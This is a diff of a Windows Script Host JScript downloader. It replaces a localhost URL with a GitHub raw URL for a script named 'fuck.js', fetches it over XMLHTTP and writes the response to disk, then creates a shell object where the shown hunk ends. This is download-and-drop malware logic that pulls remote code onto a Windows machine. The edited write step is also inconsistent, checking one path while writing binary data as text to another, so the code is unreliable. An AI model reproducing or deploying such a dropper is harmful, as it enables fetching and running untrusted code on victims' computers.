@@ -4,20 +4,18 @@
 try {
     var WshShell = WScript.CreateObject("WScript.Shell");
     var filepath = WshShell.ExpandEnvironmentStrings("%TEMP%") + "/fuck.js";
-    var url = "http://127.0.0.1/file.exe"
+    var url = "https://github.com/xiaozhu2007/FuckWYXBatch/blob/master/Deploy/fuck.js?raw=true"
     var xhr = new ActiveXObject("MSXML2.XMLHTTP")
     xhr.open("GET", url, false)
     xhr.send()
 
     var fso = new ActiveXObject("Scripting.FileSystemObject")
     if (fso.FileExists(filepath) == false) {
-        var stream = new ActiveXObject("ADODB.Stream")
-        stream.Open()
-        stream.Type = 1
-        stream.Write(xhr.ResponseBody)
-        stream.Position = 0
-        stream.SaveToFile(filepath, 2)
-        stream.Close()
+        var file = fso.Createtextfile("c:\\Fuck\\info.txt", true)
+        // 填写
+        file.Write(xhr.ResponseBody);
+        // 关闭文件
+        file.Close();
     }
 
     var shell = WScript.CreateObject("WScript.Shell")
